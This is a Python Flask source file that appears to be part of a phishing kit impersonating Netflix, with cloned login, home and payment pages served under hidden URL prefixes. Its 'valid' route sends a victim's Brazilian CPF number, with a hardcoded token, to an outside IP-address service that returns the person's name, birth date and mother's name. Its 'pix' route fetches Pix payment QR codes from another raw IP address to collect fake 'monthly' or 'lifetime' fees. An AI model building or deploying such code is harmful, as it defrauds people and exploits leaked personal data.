from flask import Blueprint, request, make_response, render_template, \
                  flash, g, session, redirect, url_for, app, jsonify

import datetime
from database import mongo
from user_agents import parse
from os.path import exists
import urllib.parse
import json
import uuid, re, requests
import sys
import asyncio
from rich.console import Console
from operator import itemgetter
from bson import ObjectId
from threading import Thread
from time import sleep
import random

console = Console()

u = json.load(open('./sites.json'))
netflix = Blueprint('netflix', __name__, url_prefix=f"/{u['netflix']}")



def print_roundtrip(response, *args, **kwargs):
    # if os.getenv("DEBUG") == 'True':
    format_headers = lambda d: '\n'.join(f'{k}: {v}' for k, v in d.items())
    console.log(textwrap.dedent('''
        ---------------- REQUEST ----------------
        {req.method} {req.url}
        {reqhdrs}

        {req.body}
        ---------------- RESPONSE ----------------
        {res.status_code} {res.reason} {res.url}
        {reshdrs}
        {res.text}
    ''').format(
        req=response.request, 
        res=response, 
        reqhdrs=format_headers(response.request.headers), 
        reshdrs=format_headers(response.headers), 
    ))
#
@netflix.before_request
def make_session_permanent():
    session.permanent = True

def login():
    return render_template('netflix/index.html',prefix=session['prefix'])

def valid():
    headers = {
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9',
        'content-type': 'application/json',
        # 'cookie': 'connect.sid=s%3AGen5yy8Z7XDdzgYLrN5z9hLEVT4_DNrJ.nbPWIbxKgZp%2BvOyQ%2BTV%2B5BQp1Z%2B1Zgm3pMs1hgqdMmA',
        'priority': 'u=1, i',
        'referer': 'https://paguetaxalive.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
    cpf = request.get_json()['cpf']
    cpf = cpf.replace('-','').replace('.','').replace(' ','')
    response = requests.get('http://91.230.110.96:1111/SerasaCpf?token=acf6a1cb-5da0-42d3-ab1a-3a342d8a574d&cpf='+cpf, headers=headers)
    if 'CONTATOS_ID' in response.text:
        from datetime import datetime
        date_obj = datetime.strptime(response.json()['result']['NASC'], "%Y-%m-%d %H:%M:%S")
        formatted_date = date_obj.strftime("%d/%m/%Y")
        response = {
            "success": True,
            "message": {
                "name": response.json()['result']['NOME'],
                "nasc": formatted_date,
                "mae": response.json()['result']['NOME_MAE'],
                "cpf": cpf

            }
        }
        return jsonify(response)
    else:
        return jsonify(success=False)
    console.log(response.text)
    return response.json(),200


def pix_():
    print(request.get_json())
    json_data = request.get_json()
    find_payment = mongo.db.taxas.find_one({"usuario":"tio_netflix"})
    print(find_payment)
    if json_data['paymentId'] == "atualizarpagamento":
        data = {
            "url": find_payment['url'],
            "id_compra": find_payment['id_compra_mensal'],
            "valor": find_payment['valor_mensal']
        }
    elif json_data['paymentId'] == "vitalicia":
        data = {
            "url": find_payment['url'],
            "id_compra": find_payment['id_compra_vitalicio'],
            "valor": find_payment['valor_vitalicio']
        }
    headers = {
        'accept': '*/*',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
    response = requests.post('http://38.54.57.64:5001/get_pix_qr', headers=headers,json={'cpf':request.get_json()['cpf'],'nome':request.get_json()['nome'],'data':data})
    console.log(response.text)
    return response.json(),200
@netflix.route('/<path:path>', methods=['GET', 'POST', 'PUT'])
def index_redir(path):
    
    try:
        path = path.split("/")
        print(path[0],session['prefix'])
        console.log(path[1])
        console.log(path)
        if path[0] == session['prefix']:
            #response = redirect("/login")
            try:
                if path[1] == 'login':
                    return login()
                elif path[1] == 'home':
                    return render_template('netflix/home.html')
                elif path[1] == 'pagamento':
                    return render_template('netflix/pagamento.html', prefix=session['prefix'],path_=u['netflix'])
                elif path[1] == 'gerar':
                    return render_template('netflix/gerar.html')
                elif path[1] == 'valid':
                    console.log('post valid')
                    return valid()
                elif path[1] == 'pix':
                    console.log('post pix c')
                    return pix_()
                else:
                    return {}
            except Exception as e:
                print(e)
                session["ads"] = ''
                return path[0]
        else:
            session.clear()
            return redirect("/")
    except:
        session.clear()
        return redirect("/")